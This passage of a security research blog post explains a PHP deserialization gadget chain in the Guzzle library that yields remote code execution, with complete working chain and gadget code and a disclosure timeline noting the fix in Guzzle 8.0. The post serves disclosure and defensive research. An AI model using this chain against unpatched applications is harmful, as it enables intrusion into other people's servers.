+</span></span><span style="display:flex; background-color:#3c3d38"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">pump</span>($remaining);
+</span></span><span style="display:flex;"><span>            $data <span style="color:#f92672">.=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">buffer</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read</span>($remaining);
+</span></span><span style="display:flex;"><span>            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tellPos</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">strlen</span>($data) <span style="color:#f92672">-</span> $readLen;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $data;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="bd-callout bd-callout-secondary rounded-3">
+<p><strong><a href="https://github.com/guzzle/psr7/blob/2.11/src/PumpStream.php#L170">Line #170:</a></strong> We will set <code>$buffer</code> property to an instance of <code>BufferStream</code>; Its <code>read</code> method can return a string to keep the program running. <a href="https://github.com/guzzle/psr7/blob/2.11/src/BufferStream.php#L123-L147">[source]</a></p>
+<hr>
+<p><strong><a href="https://github.com/guzzle/psr7/blob/2.11/src/PumpStream.php#L176">Line #176:</a></strong> <code>pump</code> method will be called.</p>
+</div>
+<div class="text-white text-start ps-1 pre-highlight text-nowrap overflow-hidden">
+  🔗 <a href="https://github.com/guzzle/psr7/blob/2.11/src/PumpStream.php#L215"></a>
+</div>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">215
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218
+</span><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">225
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">226
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">227
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">228
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">229
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pump</span>(<span style="color:#a6e22e">int</span> $length)<span style="color:#f92672">:</span> <span style="color:#a6e22e">void</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        $data <span style="color:#f92672">=</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span>)($length);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($data <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> $data <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>          $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">buffer</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">write</span>($data);
+</span></span><span style="display:flex;"><span>        $length <span style="color:#f92672">-=</span> <span style="color:#a6e22e">strlen</span>($data);
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">while</span> ($length <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="bd-callout bd-callout-secondary rounded-3">
+<p><strong><a href="https://github.com/guzzle/psr7/blob/2.11/src/PumpStream.php#L219">Line #219:</a></strong> <code>$source</code> property value will be used to call with an integer argument.</p>
+</div>
+<p><strong><code>PHP-IAA</code></strong> trick is useful here to call a suitable method/function with 1 or 0 parameter.</p>
+<div class="text-white text-start ps-1 pre-highlight text-nowrap overflow-hidden">
+  🔗 <a href="https://github.com/guzzle/guzzle/blob/7.11/src/HandlerStack.php#L216"></a>
+</div>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">216
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">217
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">218
+</span><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">219
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">220
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">221
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">222
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">223
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">224
+</span><span style="background-color:#3c3d38"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">225
+</span></span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">226
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">227
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">228
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">229
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">230
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">231
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">232
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;display:grid;"><code class="language-php" data-lang="php"><span style="display:flex; background-color:#3c3d38"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">resolve</span>()<span style="color:#f92672">:</span> <span style="color:#a6e22e">callable</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cached</span> <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex; background-color:#3c3d38"><span>      <span style="color:#66d9ef">if</span> (($prev <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handler</span>) <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\LogicException</span>(<span style="color:#e6db74">&#39;No handler has been specified&#39;</span>);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">foreach</span> (<span style="color:#a6e22e">\array_reverse</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stack</span>) <span style="color:#66d9ef">as</span> $fn) {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">/** @var callable(RequestInterface, array): PromiseInterface $prev */</span>
+</span></span><span style="display:flex; background-color:#3c3d38"><span>        $prev <span style="color:#f92672">=</span> $fn[<span style="color:#ae81ff">0</span>]($prev);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cached</span> <span style="color:#f92672">=</span> $prev;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cached</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="bd-callout bd-callout-secondary rounded-3">
+<p><strong><a href="https://github.com/guzzle/guzzle/blob/7.11/src/HandlerStack.php#L216">Line #216:</a></strong> <code>resolve</code> method is <strong>parameter-less</strong> and must return a <code>callable</code>.</p>
+<hr>
+<p><strong><a href="https://github.com/guzzle/guzzle/blob/7.11/src/HandlerStack.php#L219">Line #219:</a></strong> <code>$prev</code> value will be set from <code>$this-&gt;handler</code> and we can control it.</p>
+<hr>
+<p><strong><a href="https://github.com/guzzle/guzzle/blob/7.11/src/HandlerStack.php#L225">Line #225:</a></strong> <code>$prev=$fn[0]($prev);</code> is an arbitrary function call in a loop and the result of the function call will be used for the next function call as an argument. (function composition)</p>
+</div>
+<p>Here we can call <code>system(&quot;id&quot;);</code> or another arbitrary function. After the function call, we will face three problems that we need to find solutions for:</p>
+<ul>
+<li><strong>Type-error:</strong> <code>resolve</code> must return a <code>callable</code>. (<code>Guzzle</code> &gt;= 7.0.0-beta.1)</li>
+<li><strong>1MB Data:</strong> We need to return 1,048,576 bytes. (In one iteration or more)</li>
+<li><strong>File write issue:</strong> Guzzle will try to write a file (from save method).</li>
+</ul>
+<p>As told above, for the next iteration, the result of the previous function call will be used as argument and we CAN NOT GUESS the result of some function calls. (e.g.: reading a file content &hellip;); A solution is something like that:
+<code>system(&quot;command; echo the_value_we_want&quot;);</code> but it&rsquo;s not good enough; In a hardened environment, <code>system</code> and other related functions are disabled and we can&rsquo;t use them.</p>
+<div class="d-block p-2 my-2 text-bg-success fw-bold" id="PHP-IAA-RDV">Trick #2: PHP-IAA-RDV</div>
+<h5 class="mt-3 fw-bold" id="is-there-a-functionmethod-that-accepts-any-value-as-an-argument-and-returns-what-we-want">Is there a function/method that accepts any value as an argument and returns what we want?</h5>
+<p>It&rsquo;s PHP and almost everything is possible. By using <strong><code>PHP-IAA</code></strong> trick and calling a getter (or non-standard getter) method, we can ignore the argument(s) and return a desired value from a property.</p>
+<div class="bd-callout bd-callout-danger rounded-3">
+<p><strong>Note:</strong></p>
+<ul>
+<li><code>getters</code> or <code>non-standard getters</code> are (almost) parameter-less methods.</li>
+<li><code>__toString()</code> method is (sometimes, almost) a getter.</li>
+</ul>
+</div>
+<p>When we encounter a complex object, array, or unwanted value as argument(s), <strong><code>PHP-IAA</code></strong> trick is useful to ignore it(them) and return a desired value. I named this trick <strong><code>PHP-IAA-RDV</code></strong> (<code>Ignoring Additional Arguments</code> - <code>Returning a Desired Value</code>), which is a special case of <strong><code>PHP-IAA</code></strong>.</p>
+<p>By using the trick, we will fill <code>$prev</code> with our arbitrary value to be used as an argument for the next function call.</p>
+<div class="d-block p-2 my-2 text-bg-success fw-bold" id="PHP-ISCE">Trick #3: PHP-ISCE</div>
+<p>To stop a running code, we can use <code>set_exception_handler</code> function and trigger it by calling a non-existent function.</p>
+<ul>
+<li>For <code>PHP &gt;= 8.4.0</code> a solution is <code>exit</code> function. (<code>die</code> is an alias for <code>exit</code>)</li>
+</ul>
+<p>I named this trick <strong>&quot;<code>Intentional Stopping of Code Execution</code>&quot;</strong> or <strong>&quot;<code>PHP-ISCE</code>&quot;</strong>.</p>
+<div class="bd-callout bd-callout-danger rounded-3">
+<ul>
+<li>
+<p><strong><code>PHP-ISCE</code></strong> trick works on PHP <strong>7.x</strong> and <strong>8.x</strong>.</p>
+</li>
+<li>
+<p>If <strong><code>__toString()</code></strong> is used while <strong><code>PHP-ISCE</code></strong> is being used, it will work on <strong>PHP &gt;= 7.4</strong>.</p>
+<ul>
+<li>For <strong>PHP &lt;= 7.3</strong> throwing an exception from <code>__toString()</code> is not allowed.</li>
+</ul>
+</li>
+</ul>
+</div>
+<h3 class="mt-5" id="exploiting-function-composition">Exploiting function composition</h3>
+<hr>
+<p>The numbers indicate the n&rsquo;th iteration in the loop.</p>
+<ol>
+<li>Arbitrary function call with arbitrary argument.
+<ul>
+<li>If you DON&rsquo;T need a clean exit, other steps are <strong>NOT</strong> necessary.</li>
+</ul>
+</li>
+<li>Call a getter (<strong><code>PHP-IAA</code></strong> again) to fill <code>$prev</code> with <code>is_int</code> or <strong>other suitable method/function</strong>.</li>
+<li>Call <code>set_exception_handler(&quot;is_int&quot;)</code>. This will set <code>is_int</code> function as an exception handler. (<strong><code>PHP-ISCE</code></strong>)</li>
+<li>Call a non-existent function (like <code>&quot;1&quot;</code>) to trigger the exception handler and stop the execution. (<strong><code>PHP-ISCE</code></strong>)
+<ul>
+<li>Completely clean exit: (<strong>PHP &gt;= 7.4</strong>)
+<ul>
+<li>Without any notice/warning/error.</li>
+<li>Without any file creation.</li>
+<li>Without printing any unwanted string in the output after it.</li>
+</ul>
+</li>
+<li>(<strong>PHP &lt;= 7.3</strong>)
+<ul>
+<li>Will work but <strong>after a successful execution</strong>, an error will occur. (<strong>PHP &lt;= 8.1</strong> have reached end of life.)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>‌I&rsquo;ll share another version of this GC that works on all PHP versions without any error/warning/notice.</p>
+<h3 class="mt-5" id="other-technical-details">Other technical details:</h3>
+<hr>
+<p>The initial stage was known for years and had used in <a href="https://github.com/ambionics/phpggc/tree/master/gadgetchains/Guzzle/FW/1">Guzzle/FW1</a> to write a shell file. (By <a href="https://github.com/cfreal/">Charles Fol</a>)</p>
+<p>The <code>resolve</code> method also was known and had used in <a href="https://github.com/ambionics/phpggc/tree/master/gadgetchains/Guzzle/RCE/1">Guzzle/RCE1</a> to simply call a function. (By <a href="https://github.com/cfreal/">Charles Fol</a> and <a href="https://github.com/proclnas">Rodrigo Nas</a>)</p>
+<div class="bd-callout bd-callout-warning rounded-3">
+<p><strong>Note:</strong> Even without using <code>resolve</code> method, by doing a few changes we can use the GC again. The new trick will be explained in another blog post.</p>
+</div>
+<div class="bd-callout bd-callout-warning rounded-3">
+<p><strong>Note:</strong> Since November 2018, <a href="https://github.com/ambionics/phpggc/tree/master/gadgetchains/Guzzle/RCE/1">Guzzle/RCE1</a> has not worked. (Was a dead POP chain)</p>
+</div>
+<h4 class="mt-5" id="guzzle-rce-gc">Guzzle RCE GC</h4>
+<hr>
+<p><code>chain.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GadgetChain\Guzzle</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RCE2</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">\PHPGGC\GadgetChain\RCE\FunctionCall</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> $version <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;6.x, 7.x&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> $vector <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__destruct&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> $author <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mir-hossein (Mirhossein Rahmani)&#39;</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> $information <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;This GC has been provided to demonstrate PHP-IAA trick. Please use it only for educational purposes or legal pentest.&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">generate</span>(<span style="color:#66d9ef">array</span> $parameters)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    $function <span style="color:#f92672">=</span> $parameters[<span style="color:#e6db74">&#34;function&#34;</span>];
+</span></span><span style="display:flex;"><span>    $parameter <span style="color:#f92672">=</span> $parameters[<span style="color:#e6db74">&#34;parameter&#34;</span>];
+</span></span><span style="display:flex;"><span>         
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GuzzleHttp\Cookie\FileCookieJar</span>($function, $parameter);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><code>gadgets.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GuzzleHttp</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">HandlerStack</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $handler;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $stack;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($function, $parameter) {
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">handler</span> <span style="color:#f92672">=</span> $parameter;
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stack</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;1&#34;</span>],
+</span></span><span style="display:flex;"><span>        [<span style="color:#e6db74">&#34;set_exception_handler&#34;</span>],
+</span></span><span style="display:flex;"><span>        [
+</span></span><span style="display:flex;"><span>          [
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GuzzleHttp\Psr7\BufferStream</span>(<span style="color:#e6db74">&#39;is_int&#39;</span>),
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;__toString&#34;</span>
+</span></span><span style="display:flex;"><span>          ]
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>        [$function]
+</span></span><span style="display:flex;"><span>      ];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GuzzleHttp\Psr7</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PumpStream</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $source;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $buffer;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($function, $parameter) {
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BufferStream</span>(<span style="color:#e6db74">&#39;&#39;</span>);
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GuzzleHttp\HandlerStack</span>($function, $parameter),
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;resolve&#34;</span>
+</span></span><span style="display:flex;"><span>      ];
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BufferStream</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $buffer;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($value) {
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> $value;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">GuzzleHttp\Cookie</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">FileCookieJar</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $filename;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($function, $parameter) {
+</span></span><span style="display:flex;"><span>      $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\GuzzleHttp\Psr7\PumpStream</span>($function, $parameter);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="bd-callout bd-callout-success rounded-3">
+<p>The GC will be available in <a href="https://github.com/ambionics/phpggc">PHPGGC</a> soon. To access it before that you can use <a href="https://github.com/mir-hossein/phpggc">this link</a>. (Check branches)</p>
+<ul>
+<li>This GC could be minimized, but I avoided it to keep the explanation simpler.</li>
+</ul>
+</div>
+<h3 class="mt-5" id="timeline">Timeline</h3>
+<hr>
+<table class="table table-striped table-dark table-responsive align-middle">
+  <thead>
+    <tr>
+      <th scope="col" class="nowrap col-3">Date</th>
+      <th scope="col">Description</th>
+    </tr>
+  </thead>
+  <tbody class="table-group-divider">
+    <tr>
+      <td scope="row">20??-???-??</td>
+      <td>The GC was found. (I don't remember when, but it was years ago.)</td>
+    </tr>
+    <tr>
+      <td scope="row">2025-Jul-15</td>
+      <td>Reported to Guzzle team via <span class="fw-bold text-danger">Tidelift/Sonarsource</span>.</td>
+    </tr>
+    <tr>
+      <td scope="row">2026-May-22</td>
+      <td>Reported to Guzzle team again. (No answer after 10 months.)</td>
+    </tr>
+    <tr>
+      <td scope="row">2026-Jun-9</td>
+      <td>Reported to the maintainer. (Third time)</td>
+    </tr>
+    <tr>
+      <td scope="row">2026-Jun-10</td>
+      <td>
+<p>It appeared that they hadn&rsquo;t accepted my report. However, their approach to other similar reports was different (IMO). See <a href="https://github.com/guzzle/psr7/pull/165">PSR7 PR #165</a>, <a href="https://github.com/guzzle/guzzle/pull/3286">PR #3286</a>, <a href="https://github.com/guzzle/guzzle/pull/3326">PR #3326</a> and <a href="https://github.com/guzzle/guzzle/pull/3334">PR #3334</a>. But &hellip; 👇</td>
+</tr>
+<tr>
+<td scope="row">2026-Jun-10</td>
+<td>
+<span class="text-success">They made the changes that had been recommended to them in the email, though they hadn&rsquo;t accepted the report.</span> <a href="https://github.com/guzzle/guzzle/pull/3618">PR 3618</a> and <a href="https://github.com/guzzle/psr7/pull/786">PR 786</a>.</td>
+</tr>
+<tr>
+<td scope="row">2026-Jun-10</td>
+<td>They have given their approval to publish this blog post.</td>
+</tr>
+<tr>
+<td scope="row">2026-Jun-10</td>
+<td>I decided to postpone publishing the article until the update is released.</td>
+</tr>
+<tr>
+<td scope="row">2026-Jul-20</td>
+<td>Guzzle 8.0 was released. 🎉</td>
+</tr>
+<tr>
+<td scope="row">2026-Oct-22</td>
+<td>Blog post was published.</td>
+</tr></p>
+  </tbody>
+</table>
+<h3 class="mt-5" id="recommendation">Recommendation</h3>
+<hr>
+<p>Please read <a href="../../../posts/en/php-termination-process-trick">my next blog post</a>; I will use another native PHP behavior to bypass <code>__wakeup</code> in <code>FnStream</code> class to introduce a new RCE GC for Guzzle.</p>
+<h3 class="mt-5" id="conclusion">Conclusion</h3>
+<hr>
+<p><strong><code>PHP-IAA</code></strong> is based on a native PHP behavior and will <strong>NOT</strong> be fixed in the near future. This trick is NOT limited to deserialization only and has broader applications.</p>
+<p>Please use it only for good purposes. I shared it to inform defensive teams and to document the trick, <strong>NOT</strong> to annoy people.</p>
+<p>Most PHP developers know about <strong><code>PHP-IAA</code></strong>; This blog post only shows the security aspect of an obvious concept by demonstrating a new RCE GC for a popular library with over 1,000,000,000 installs after +7 years.</p>
+<p><strong>The issue (POP chain) has been solved on <span class="text-danger">Guzzle 8.0</span></strong>. I&rsquo;m happy that I was able to take even a small step toward improving the security of this library.</p>
+<div class="bd-callout bd-callout-warning rounded-3">
+<p>This blog post is part of <a href="../../../research/#PHP-Deserialization">a larger research project</a>. More articles will be published gradually.</p>
+</div>
+<p>I plan to publish a GC for <strong>Monolog</strong> that uses <strong><code>PHP-IAA-RDV</code></strong> trick at the same time as this article is published. (Based on my old GC <code>Monolog/RCE9</code>)</p>
